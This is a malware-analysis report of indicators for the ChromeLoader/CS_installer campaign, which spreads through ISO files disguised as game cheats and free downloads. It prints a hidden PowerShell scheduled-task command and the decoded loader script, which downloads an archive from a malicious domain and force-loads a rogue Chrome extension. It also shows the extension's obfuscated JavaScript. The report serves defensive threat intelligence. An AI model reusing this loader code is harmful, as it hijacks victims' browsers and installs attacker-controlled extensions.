# Observed malicious IOCs for the CS_installer Malware

### Date of first occurrence

01-04-2022

### Sample Analysis
https://app.any.run/tasks/bfb74c9f-89d0-4c3b-8c65-233677cdbfc5

### Domains Observed

```
hxxps[://]learnataloukt[.]xyz
hxxps[://]brokenna[.]work
```

### Malicious ISO

The Naming convention of the ISOs appear to be targeting young adults.

```
Universal Chat Spammer.iso
Roblox Muscle Legends Script _ AutoFarm + More ....iso
[UPDATED] Bee Swarm Simulator Script GUI _ Hack....iso
This_Young_Maidenhead_Family_Now_Makes_15800_..._1.iso
The Sims 4 [w_ ALL DLC] Free Download.iso
How To Install Shaders For Minecraft 1.18.1_1....iso => reported by reddit user remuchiiee
```

https://www.virustotal.com/gui/file/fa52844b5b7fcc0192d0822d0099ea52ed1497134a45a2f06670751ef5b33cd3  
https://www.virustotal.com/gui/file/b43767a9b780ba91cc52954aa741be1bddb0905b492e481aea992bca2a0c6a93  

mounted ISO mainly contains:
```
\Device\CdRom0\CS_INSTALLER.EXE
\Device\CdRom0\CS_installer.exe.config
\Device\CdRom0\CS_installer.pdb
\Device\CdRom0\CS_installer.pdb
\Device\CdRom0\Microsoft.Win32.TaskScheduler.dll
```

### CS_installers

https://www.virustotal.com/gui/file/ded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd  
https://www.virustotal.com/gui/file/5f57a4495b9ab853b9d2ab7d960734645ebe5765e8df3b778d08f86119e1695c  
https://www.virustotal.com/gui/file/187e08fca3ea9edd8340aaf335bd809a9de7a10b2ac14651ba292f478b56d180  

### Reads hostname

```
HKEY_LOCAL_MACHINE\SYSTEM\CONTROLSET001\CONTROL\COMPUTERNAME\ACTIVECOMPUTERNAME
```

### Scheduled Task

```
ChromeLoader

cmd /c start /min "" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E <base64EncodedPayload>
```

### Snippet of base64 decoded powershell script

```powershell
$extPath = "$($env:LOCALAPPDATA)\chrome"
$confPath = "$extPath\conf.js"
$archiveName = "$($env:LOCALAPPDATA)\archive.zip"
$taskName = "ChromeLoader"
$domain = "SomeMaliciousDomain"

$isOpen = 0
$dd = 0
$ver = 0

(Get-WmiObject Win32_Process -Filter "name='chrome.exe'") | Select-Object CommandLine | ForEach-Object {
	if($_ -Match "load-extension"){
		break
	}

	$isOpen = 1
}

if($isOpen){

	if(-not(Test-Path -Path "$extPath")){

		try{
			wget "https://$domain/archive.zip" -outfile "$archiveName"
		}catch{
			break
		}

		Expand-Archive -LiteralPath "$archiveName" -DestinationPath "$extPath" -Force
		Remove-Item -path "$archiveName" -Force

	}
	else{

		try{
			if (Test-Path -Path "$confPath")
			{
				$conf = Get-Content -Path $confPath
				$conf.Split(";") | ForEach-Object {
					if ($_ -Match "dd")
					{
						$dd = $_.Split('"')[1]
					}elseif ($_ -Match "ExtensionVersion")
					{
						$ver = $_.Split('"')[1]
					}
				}
			}
		}catch{}

		if ($dd -and $ver){


			try{

				$un = wget "https://$domain/un?did=$dd&ver=$ver"

				if($un -Match "$dd"){
					Unregister-ScheduledTask -TaskName "$taskName" -Confirm:$false
					Remove-Item -path "$extPath" -Force -Recurse
				}

			}catch{}

			try{
				wget "https://$domain/archive.zip?did=$dd&ver=$ver" -outfile "$archiveName"
			}
			catch{}

			if (Test-Path -Path "$archiveName"){
				Expand-Archive -LiteralPath "$archiveName" -DestinationPath "$extPath" -Force
				Remove-Item -path "$archiveName" -Force
			}

		}

	}

	try{
		Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}
		start chrome --load-extension="$extPath", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble
	}catch{}

}
```

Malicious Extension

```
sha256sum archive.zip
561f219a76e61d113ec002ecc4c42335f072be0f2f23e598f835caba294a3f9b  archive.zip

Contents:
background.js  conf.js  manifest.json  options.png
```

Sample Extension Configuration
```
cat conf.js

let _ExtnensionName = "Options";
let _ExtensionVersion = "4.0";
let _dd = "MzQ1NDYHAQICAwIGDAEAAgEFAgILBwAMSgoABgYDB0gEAgICAgUHAwAASQ==";
let _ExtDom = "https://krestinaful[.]com/";
let _ExtDomNoSchema = "krestinaful[.]com"
```

Sample Obfuscated Javascript
```js
cat background.js

T1MM.q3 = (function () {
    var v = 2;
    for (; v !== 9;) {
        switch (v) {
        case 2:
            v = typeof globalThis === 'object' ? 1 : 5;
            break;
        case 1:
            return globalThis;
            break;
        case 5:
            var G;
            try {
                var s = 2;
                for (; s !== 6;) {
                    switch (s) {
                    case 2:
                        Object['defineProperty'](Object['prototype'], 'xbHiy', {
                            'get': function () {
                                var J = 2;
                                for (; J !== 1;) {
                                    switch (J) {
                                    case 2:
                                        return this;
                                        break;
                                    }
                                }
                            },
                            'configurable': true
                        });
                        G = xbHiy;
                        s = 5;
                        break;
                    case 5:
                        G['QQr8M'] = G;
                        s = 4;
                        break;
                    case 4:
                        s = typeof QQr8M === 'undefined' ? 3 : 9;
                        break;
                    case 9:
                        delete G['QQr8M'];
                        var N = Object['prototype'];
                        delete N['xbHiy'];
                        s = 6;
                        break;
                    case 3:
                        throw "";
                        s = 9;
                        break;
                    }
                }
            } catch (l) {
                G = window;
            }
            return G;
            break;
        }
    }
})();
T1MM.A1MM = A1MM;
e7(T1MM.q3);
[TRUNCATION..]
```
